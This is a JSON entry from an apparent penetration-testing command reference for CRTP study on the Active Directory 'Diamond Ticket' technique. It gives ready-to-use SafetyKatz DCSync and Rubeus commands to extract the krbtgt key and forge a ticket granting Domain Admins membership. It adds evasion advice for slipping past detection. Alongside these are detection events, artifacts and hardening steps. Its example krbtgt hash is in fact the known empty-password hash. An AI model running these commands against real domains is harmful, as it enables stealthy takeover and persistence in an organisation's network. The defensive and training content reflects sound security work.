{
  "id": "crtp-diamond-ticket",
  "name": "Diamond Ticket (Rubeus /tgtdeleg)",
  "command": "Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<rid> /groups:512 /krbkey:<aes256_key> /nowrap",
  "description": "Request a legitimate TGT and modify its PAC to add privileged group memberships. Evades Golden Ticket detection since the TGT has valid DC signatures.",
  "platform": "windows",
  "category": "Active Directory",
  "subcategory": "Persistence",
  "type": "command",
  "certifications": [
    "CRTP"
  ],
  "source": "CRTP",
  "opsec": "quiet",
  "mitre": [
    "T1558.001"
  ],
  "tools": [
    "Rubeus"
  ],
  "tags": [
    "diamond-ticket",
    "golden-ticket",
    "pac",
    "persistence",
    "stealth",
    "rubeus"
  ],
  "steps": [
    {
      "label": "Get krbtgt AES256 key via DCSync",
      "command": "SafetyKatz.exe \"lsadump::dcsync /user:<domain>\\krbtgt\" \"exit\""
    },
    {
      "label": "Get current user RID",
      "command": "(Get-ADUser -Identity <user>).SID.Value.Split('-')[-1]"
    },
    {
      "label": "Create diamond ticket",
      "command": "Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<rid> /groups:512 /krbkey:<aes256_key> /nowrap /ptt"
    },
    {
      "label": "Verify membership via ticket",
      "command": "klist"
    }
  ],
  "examples": [
    {
      "label": "Diamond ticket adding to Domain Admins (512)",
      "command": "Rubeus.exe diamond /tgtdeleg /ticketuser:jdoe /ticketuserid:1105 /groups:512 /krbkey:<aes256_key> /nowrap /ptt"
    },
    {
      "label": "Check ticket has DA group",
      "command": "klist"
    }
  ],
  "recommended": [
    {
      "id": "crtp-dcsync",
      "note": "Get krbtgt AES256 key via DCSync",
      "rel": "prereq"
    },
    {
      "id": "crtp-golden-ticket",
      "note": "Classic golden ticket alternative",
      "rel": "alternative"
    },
    {
      "id": "crtp-silver-ticket",
      "note": "Service-specific persistence",
      "rel": "alternative"
    },
    {
      "id": "crtp-child-to-parent",
      "rel": "next",
      "note": "Use the elevated TGT (SID history / extra SIDs) to escalate from child to parent domain"
    }
  ],
  "notes": "Uses /tgtdeleg to get a real delegated TGT, then modifies the PAC. The DC's server signature is real — evades standard golden ticket detection.",
  "references": [
    {
      "title": "CRTP - Diamond Ticket",
      "url": "https://www.alteredsecurity.com/adlab"
    }
  ],
  "defense": {
    "why_it_works": "Diamond Tickets improve on Golden Tickets by legitimately requesting a real TGT from the KDC (as the target user using /tgtdeleg on their existing TGT), then decrypting and modifying the PAC in-memory to add extra SIDs (like Domain Admins) before re-signing with the krbtgt hash. This produces a ticket that looks legitimate to KDC validation — it has a real timestamp, real encryption, and a real TGT structure — but with forged group memberships.",
    "prerequisites": "krbtgt NTLM hash or AES key (from DCSync). A valid low-privilege TGT (via /tgtdeleg from an existing session). Rubeus /diamond or /tgtdeleg with PAC modification. Domain SID.",
    "impact": "T1558.001 Steal or Forge Kerberos Tickets: Golden Ticket. Bypasses Golden Ticket detection heuristics (real ticket timestamp, legitimate AS-REQ exists). Full domain admin access via the forged PAC group memberships. Harder to detect than standard Golden Tickets.",
    "detection": "MDI: 'Golden Ticket usage' heuristics may miss Diamond Tickets (more advanced detection needed). Event 4768 (AS-REQ) does exist for Diamond Tickets (unlike pure Golden Tickets). Anomaly: group memberships in the ticket's PAC don't match the account's actual AD group memberships — requires PAC validation to detect. Microsoft Sentinel Analytics: 'Suspected Diamond Ticket Usage'.\nAnomalous Kerberos activity: forged or stolen tickets by correlating malformed fields in logon events, RC4-encrypted TGTs, or TGS requests without corresponding TGT requests; suspicious processes accessing LSASS memory for ticket extraction (DET0522/AN1443).\nSuspicious access to SSSD secrets database and Kerberos key material indicating ticket theft or replay; correlate anomalous file access with unusual Kerberos service ticket requests (AN1444).\nForging or replaying Kerberos tickets: monitor Unified Logs for anomalous kinit/klist activity and unusual authentication sequences (AN1445).",
    "artifacts": "MDI alert if diamond ticket PAC inconsistency detected | Event 4768 (real AS-REQ from legitimate user) | Subsequent 4769 with escalated group memberships | PAC group SIDs inconsistent with user's actual groups in AD",
    "prevention": "Double-rotate krbtgt (same as Golden Ticket — Diamond Ticket requires krbtgt hash). PAC validation enforcement. MDI deployment with latest signatures. Enforce tiering — even with DA group in PAC, privileged access should require logon from PAW (Authentication Policy Silo). Monitor group membership anomalies via SIEM.\nActive Directory Configuration: Reset KRBTGT account password twice (invalidates all golden tickets); rotate every 180 days.\nAudit: Scan for insecure Kerberos configurations.\nCredential Access Protection: On Linux, use SELinux to protect Kerberos key material.\nEncrypt Sensitive Information: Enable AES Kerberos encryption instead of RC4.\nPassword Policies: Service accounts should have 25+ character passwords; use Group Managed Service Accounts (gMSA).\nPrivileged Account Management: Limit domain admin to DCs only; restrict service account privileges.",
    "evasion": "Diamond Ticket already bypasses most Golden Ticket detections by using a real AS-REQ. Use /aes256 for krbtgt to further blend with normal AES Kerberos traffic. Limit forged group memberships to the minimum needed.",
    "sources": [
      "https://attack.mitre.org/techniques/T1558/001/"
    ],
    "misconfiguration": "krbtgt password never rotated. PAC validation not enforced. MDI not deployed or not updated. No SIEM correlation of PAC group membership anomalies.",
    "vulnerable_config": "# krbtgt hash available (from DCSync or NTDS.dit):\n# Attacker has: krbtgt NTLM hash 31d6cfe0d16ae931b73c59d7e0c089c0\n# + valid TGT for user 'helpdesk1' (low-priv)\n# → Rubeus /diamond /tgtdeleg modifies PAC → DA-equivalent access\n# Unlike Golden Ticket, AS-REQ log entry EXISTS → detection harder",
    "secure_config": "# Same mitigation as Golden Ticket — requires krbtgt hash:\n# Double-rotate krbtgt (Microsoft script):\n.\\New-KrbtgtKeys.ps1 -Mode EnableAES\n# Wait 10+ hours, repeat\n\n# PAC validation:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name ValidateKdcPacSignature -Value 1\n\n# Enforce Authentication Policy Silos for DA accounts:\n# Even with DA PAC, restrict which computers DAs can authenticate from\nNew-ADAuthenticationPolicy -Name 'DA-Policy' -UserAllowedToAuthenticateFrom 'PAW-Computers-SG'"
  },
  "variations": [
    {
      "label": "AES key",
      "command": "Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<rid> /groups:512 /krbkey:<krbtgt_aes> /nowrap"
    }
  ]
}